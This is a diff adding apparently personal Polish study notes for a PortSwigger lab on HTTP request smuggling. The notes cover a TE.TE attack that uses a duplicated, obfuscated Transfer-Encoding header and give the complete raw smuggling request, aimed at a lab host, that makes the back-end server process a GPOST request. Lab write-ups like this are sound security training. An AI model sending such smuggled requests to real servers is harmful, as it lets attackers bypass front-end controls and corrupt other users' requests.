@@ -1,0 +1,31 @@
+To laboratorium obejmuje serwer front-end i back-end, a oba serwery obsługują zduplikowane nagłówki żądań HTTP na różne sposoby. Serwer frontonu 
+odrzuca żądania, które nie używają metody GET ani POST.
+
+Aby rozwiązać laboratorium, przemytuj żądanie do serwera zaplecza, aby następne żądanie przetworzone przez serwer zaplecza wydawało się używać 
+metody GPOST.
+Wskazówka
+
+Ręczne naprawianie pól długości w atakach polegających na przemycie żądań może być trudne. Nasze rozszerzenie HTTP Request Smuggler Burp zostało 
+zaprojektowane, aby pomóc. Możesz go zainstalować za pośrednictwem BApp Store.
+Notatka
+
+W burpie trzeba wylaczyc Update-Content-Length (bo automatycznie zmienia przysysylaniu dlugosc naglowka Content-length)
+
+[Request] - na koncu 2x [enter]
+POST / HTTP/1.1
+Host: 0afc004a0321df1cc05b9cd400fa000c.web-security-academy.net
+Content-Type: application/x-www-form-urlencoded
+Content-length: 4
+Transfer-Encoding: chunked
+Transfer-encoding: cow
+
+5c
+GPOST / HTTP/1.1
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 15
+
+x=1
+0
+
+
+[/Request]
